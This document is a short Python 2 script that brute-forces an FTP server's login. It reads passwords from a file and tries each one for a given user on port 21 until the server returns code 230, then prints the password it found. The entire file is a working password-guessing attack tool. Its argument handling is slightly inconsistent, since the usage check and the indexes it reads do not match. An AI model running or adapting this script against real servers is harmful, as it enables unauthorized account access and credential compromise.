#!/usr/bin/python
import sys
import re
import socket


if len(sys.argv) < 2:
	print "Usage python ftp2.py usuario"
	sys.exit(0)

user = sys.argv[2]
file = open("pass.txt")
for line in file.readlines():

	print "Testing...%s:%s" %(user,line)
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((sys.argv[1],21))
	s.recv(1024)
	s.send("USER "+user+"\r\n")
	s.recv(1024)
	s.send("PASS "+line+"\r\n")
	result = s.recv(1024)
	s.send("QUIT\r\n")

	if re.search("230",result):
		print "[+]Got the FTP password:%s"%(line)
		sys.exit(0)
	else:
		print "[-]You couldn't crack this shit[-]\n"

